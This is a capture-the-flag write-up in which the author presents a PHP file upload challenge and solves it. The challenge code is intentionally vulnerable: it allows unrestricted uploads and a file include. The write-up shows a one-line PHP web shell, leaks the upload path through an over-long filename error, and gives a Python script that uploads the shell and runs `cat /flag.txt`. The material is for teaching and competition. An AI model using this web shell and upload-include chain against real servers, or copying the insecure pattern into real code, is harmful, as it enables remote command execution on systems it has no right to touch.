# Web: Upload Fun

This is a web challenge I created for the WolvSec club CTF event hosted March 2024.

## Description

I made a website where you can upload files.

What could go wrong?

**Note:** Automated tools like sqlmap and dirbuster are not allowed (and will not be helpful anyway).

## Overview

It is based on an Imaginary CTF (https://imaginaryctf.org/Challenges) challenge I saw last year.

When you visit the link you are provided with the full source:

```php
<?php
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        if ($_FILES["f"]["size"] > 1000) {
            echo "file too large";
            return;
        }

        if (str_contains($_FILES["f"]["name"], "..")) {
            echo "no .. in filename please";
            return;
        }

        if (empty($_FILES["f"])){
            echo "empty file";
            return;
        }

        $ip = $_SERVER['REMOTE_ADDR'];
        $flag = file_get_contents("/flag.txt");
        $hash = hash('sha256', $flag . $ip);

        if (move_uploaded_file($_FILES["f"]["tmp_name"], "./uploads/" . $hash . "_" . $_FILES["f"]["name"])) {
            echo "upload success";
        } else {
            echo "upload error";
        }
    } else {
        if (isset($_GET["f"])) {
            $path = "./uploads/" . $_GET["f"];
            if (str_contains($path, "..")) {
                echo "no .. in f please";
                return;
            }
            include $path;
        }

        highlight_file("index.php");
    }
?>
```



# Analysis

It is clear that:

- you can upload a small file to the server
- your filename cannot have `..` in it
- your file is moved into a `./uploads/<some-hash>_<the-filename-you-provided-in-the-upload>`
- if you give a `?f=<some-filename>`, it will "include" that file from the `upload` folder (but it cannot have `..` ) in it

The hash being used here turns out to be the SHA256 hash of the flag itself.

If only you knew the flag, then you could compute the hash and be able to access your uploaded file inside your browser using the `?f=<filename>`.

Of course, if you knew the flag, you wouldn't need to access your uploaded file.

At this point, the contestant is likely thinking...

If I can upload a small `payload.php` file containing:

```php
<?php
    echo system($_GET["cmd"]);
?>
```

and somehow learn where it was uploaded, then you can run system commands of your choosing to read the `/flag.txt` file.

But there seems to be no way to learn where it was uploaded.

Other contestants might be thinking there is some way to bypass the `..` filter.  But there seems to be no way to do that.

# Thinking Outside the Box

The trick here is to upload a small file with a REALLY LONG filename.

This will cause the php to leak the full file path in an error message.

The notion of leaking information via errors comes into play occasionally in CTF challenges and so is a good trick to keep in mind.

Something like this is returned:

```html
<b>Warning</b>:  move_uploaded_file(./uploads/331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA): Failed to open stream: File name too long in <b>/var/www/html/index.php</b> on line <b>22</b><br />
```



Now you know the SHA256 hash of the flag is `331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d`

# Solve

Armed with this knowledge, you can upload your small `payload.php` (described above).

Then you can read the flag with a URL like:

https://upload-fun-okntin33tq-ul.a.run.app/?f=331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d_payload.php&cmd=cat%20/flag.txt

which returns:

```
wctf{h0w_d1d_y0u_gu355_th3_f1l3n4me?_7523015134}
```



# Solve Script

Here's my solve script:

```php
import os
import re
import requests
from io import BytesIO

URL = os.getenv('CHAL_URL') or 'https://upload-fun-okntin33tq-ul.a.run.app/'


def uploadFile(filename):
    # Your binary string data
    binary_data = b"""
    <?php
        echo system($_GET["cmd"]);
    ?>
    """

    # Create a BytesIO object to simulate a file
    file_object = BytesIO(binary_data)

    # Prepare the files dictionary with filename control
    files = {'f': (filename, file_object)}

    # Send the POST request with the simulated file
    response = requests.post(URL, files=files)

    # print(response.status_code, response.text)
    return response


filename = 'payload.php'

uploadFile(filename)


tooLongFilename = 'A' * 4000
response = uploadFile(tooLongFilename)

pattern = r"/uploads/(?P<hash>.+)_"
match = re.search(pattern, response.text)

if match:
    hash = match.group("hash")
    # print(f"Extracted hash: {hash}")
    url = URL + f'?f={hash}_{filename}&cmd=cat%20/flag.txt'

    response = requests.get(url)

    # print(response.status_code, response.text)

    if 'wctf{' in response.text:
        print('SOLVED: upload-fun')
    else:
        print('FAILED2: upload-fun')
else:
    print('FAILED1: upload-fun', response.text)

```
